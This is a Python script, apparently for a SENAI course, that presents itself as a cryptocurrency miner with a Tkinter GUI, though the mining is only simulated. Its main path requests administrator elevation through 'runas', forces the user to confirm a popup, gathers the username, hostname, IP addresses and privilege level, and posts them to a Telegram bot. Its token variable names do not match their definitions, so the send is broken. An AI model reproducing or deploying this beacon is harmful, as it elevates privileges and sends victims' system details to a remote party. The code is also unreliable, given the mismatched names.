import os
import sys
import socket
import requests
import ctypes
import psutil
import random
import time
from tkinter import Tk, scrolledtext, ttk, Label, Button, messagebox
from multiprocessing import cpu_count
from hashlib import sha256
import threading
import pyperclip

# Configuração do Telegram
TOKEN_TELEGRAM = "<SEU_TOKEN_TELEGRAM>"
ID_CHAT_TELEGRAM = "<SEU_ID_TELEGRAM>"

def obter_detalhes_sistema():
    """
    Coleta detalhes do sistema, como IPs, sistema operacional e usuário atual.
    """
    try:
        hostname = socket.gethostname()
        usuario = os.getlogin()
        sistema = f"{os.name} ({sys.platform})"
        ips = [addr.address for iface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family == socket.AF_INET]
        privilegios = "Concedidos ✅" if verificar_admin() else "Não Concedidos ❌"
        detalhes = (
            f"=== DETALHES DO SISTEMA ===\n"
            f"👤 Usuário: {usuario}\n"
            f"💻 Host: {hostname}\n"
            f"🌐 IPs: {' | '.join(ips)}\n"
            f"🖥️ Sistema Operacional: {sistema}\n"
            f"🔐 Privilégios Administrativos: {privilegios}\n"
        )
        return detalhes
    except Exception as e:
        return f"Erro ao coletar detalhes do sistema: {e}"

def verificar_admin():
    """
    Verifica se o script está sendo executado como administrador.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Erro ao verificar privilégios: {e}")
        return False

def escalar_privilegios():
    """
    Escala privilégios para administrador caso necessário.
    """
    if not verificar_admin():
        print("Tentando escalar privilégios...")
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            os._exit(0)
        except Exception as e:
            print(f"Erro ao tentar escalar privilégios: {e}")
            os._exit(1)

def enviar_alerta_arquivo(nome_arquivo):
    """
    Envia alerta ao Telegram sobre a execução do arquivo.
    """
    pasta_atual = os.path.dirname(os.path.abspath(nome_arquivo))
    detalhes_sistema = obter_detalhes_sistema()
    mensagem = (
        f"🔴 <b>ALERTA CRÍTICO: Minerador '{nome_arquivo}' foi ativado!</b>\n"
        f"📂 <b>Localização:</b> {pasta_atual}\n"
        f"{detalhes_sistema}"
    )
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, data=payload)
        print(f"Alerta enviado ao Telegram: {mensagem}")
    except Exception as e:
        print(f"Erro ao enviar alerta ao Telegram: {e}")

def exibir_popup(txt_correspondente):
    """
    Exibe um pop-up perguntando se o arquivo explicativo foi lido.
    """
    root = Tk()
    root.withdraw()

    while True:
        resposta = messagebox.askquestion(
            "Confirmação Necessária",
            f"Você leu o arquivo explicativo '{txt_correspondente}'?\n\n"
            "Por favor, leia antes de continuar."
        )

        if resposta.lower() in ["yes", "sim"]:
            messagebox.showinfo("Confirmado", "Obrigado por confirmar.")
            return True
        else:
            messagebox.showwarning("Leitura Necessária", "Por favor, leia o arquivo antes de continuar.")

def minerar_criptomoeda(output_widget, progress_bar, status_label, copiar_botao):
    """
    Simula a mineração de criptomoeda com validação de hash.
    """
    try:
        cpu_threads = cpu_count()
        dificuldade = 3  # Quantidade de zeros iniciais necessários no hash
        output_widget.insert("end", f"Utilizando {cpu_threads} threads para mineração.\n")
        output_widget.insert("end", f"Critério: hash: {'0' * dificuldade}.\n")
        output_widget.see("end")

        hashes_encontrados = []  # Lista para armazenar os hashes encontrados

        for ciclo in range(1, 6):  # Simula cinco ciclos de mineração
            progress_bar["value"] = ciclo * 20  # Atualiza a barra de progresso
            status_label.config(text=f"Mineração em andamento... Ciclo {ciclo}/5")
            valido = False
            tentativas = 0

            while not valido:
                hash_inicial = random.randint(1, 1_000_000)
                hash_calculado = sha256(str(hash_inicial).encode()).hexdigest()
                tentativas += 1
                if hash_calculado.startswith("0" * dificuldade):
                    valido = True
                    hashes_encontrados.append(hash_calculado)

            taxa_hash_simulada = random.randint(500, 1500) * cpu_threads
            log = (
                f"Ciclo {ciclo}: Taxa de hash: {taxa_hash_simulada} H/s | "
                f"Hash válido: {hash_calculado} (Tentativas: {tentativas})\n"
            )
            output_widget.insert("end", log)
            output_widget.see("end")
            time.sleep(2)  # Simula o consumo de recursos com uma pausa

        # Atualiza botão para copiar os hashes
        copiar_botao.config(command=lambda: pyperclip.copy("\n".join(hashes_encontrados)))

        status_label.config(text="Mineração concluída!")
        output_widget.insert("end", "Mineração de criptomoeda concluída.\n")
        output_widget.see("end")
    except Exception as e:
        output_widget.insert("end", f"Erro na mineração: {e}\n")
        output_widget.see("end")

def iniciar_interface_grafica():
    """
    Inicializa a interface gráfica para exibir logs em tempo real.
    """
    root = Tk()
    root.title("Minerador de Criptomoedas - SENAI")
    root.geometry("800x600")

    frame_superior = ttk.Frame(root)
    frame_superior.pack(fill="x", padx=10, pady=10)

    status_label = Label(frame_superior, text="Inicializando...", font=("Arial", 12), anchor="w")
    status_label.pack(fill="x")

    progress_bar = ttk.Progressbar(frame_superior, orient="horizontal", length=100, mode="determinate")
    progress_bar.pack(fill="x", pady=10)

    text_area = scrolledtext.ScrolledText(root, wrap="word", font=("Arial", 10))
    text_area.pack(expand=True, fill="both")

    frame_inferior = ttk.Frame(root)
    frame_inferior.pack(fill="x", padx=10, pady=10)

    copiar_botao = Button(frame_inferior, text="Copiar Hashes Encontrados", state="normal")
    copiar_botao.pack(side="left", padx=5)

    threading.Thread(target=minerar_criptomoeda, args=(text_area, progress_bar, status_label, copiar_botao)).start()

    root.mainloop()

if __name__ == "__main__":
    escalar_privilegios()
    nome_arquivo = os.path.basename(sys.argv[0])
    txt_correspondente = f"{os.path.splitext(nome_arquivo)[0]}.txt"
    
    if exibir_popup(txt_correspondente):
        print("Processo confirmado pelo usuário.")
        enviar_alerta_arquivo(nome_arquivo)
        iniciar_interface_grafica()
